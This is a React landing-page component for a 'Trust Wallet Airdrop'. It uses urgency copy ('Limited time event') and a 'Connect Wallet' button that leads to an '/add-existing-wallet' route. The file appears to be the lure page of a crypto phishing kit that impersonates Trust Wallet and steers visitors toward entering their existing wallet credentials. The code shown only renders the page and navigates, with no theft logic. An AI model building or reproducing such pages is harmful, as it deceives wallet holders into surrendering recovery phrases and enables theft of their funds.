import { useNavigate } from 'react-router-dom'
import { IoChevronDown } from 'react-icons/io5'
import trustShield from '../../assets/trust-shield.png'

function LandingPage() {
  const navigate = useNavigate()

  return (
    <main className="landing-page">
      <div className="landing-stage" aria-label="Trust Wallet airdrop">
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img
            className="landing-shield landing-shield-primary"
            src={trustShield}
            alt=""
          />
        </div>
        <img
          className="landing-shield landing-shield-small"
          src={trustShield}
          alt=""
        />
        <img
          className="landing-shield landing-shield-tiny"
          src={trustShield}
          alt=""
        />

        <section className="landing-copy">
          <p>Limited time event.</p>
          <h1>Trust Wallet Airdrop</h1>
          <span>
            Our airdrop campaign is now live! Connect your wallet below to check your
            eligibility!
          </span>
          <button type="button" onClick={() => navigate('/add-existing-wallet')}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">
          <IoChevronDown />
        </div>
      </div>
    </main>
  )
}

export default LandingPage
